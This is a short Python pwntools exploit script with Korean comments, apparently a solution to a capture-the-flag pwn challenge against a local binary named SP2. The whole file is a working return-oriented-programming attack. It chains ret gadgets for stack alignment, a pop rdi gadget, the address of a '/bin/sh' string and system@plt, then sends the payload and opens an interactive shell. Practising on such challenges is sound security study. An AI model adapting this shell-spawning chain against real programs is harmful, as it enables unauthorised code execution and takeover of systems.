from pwn import *

# 대상 프로그램 실행
p = process('./SP2')

# 가젯 주소 정의
ret = 0x40101a          # ret 가젯
pop_rdi_ret = 0x401243  # pop rdi; ret 가젯

# PLT와 전역 변수 주소 정의
system_plt = 0x401060   # system 함수의 PLT 주소
binsh = 0x402004        # 전역 변수 binsh의 주소 ("/bin/sh" 문자열)

# 페이로드 구성
payload = p64(ret) * 6  # 스택 정렬을 위한 ret 가젯 6번 반복
payload += p64(pop_rdi_ret)  # pop rdi; ret 가젯 추가
payload += p64(binsh)    # "/bin/sh" 문자열의 주소를 rdi에 설정
payload += p64(system_plt)  # system 함수 호출
payload += p64(0)        # 반환 주소 설정
payload += b'\x00'       # 문자열 종료 문자 추가

# 페이로드 전송
p.send(payload)

p.interactive()
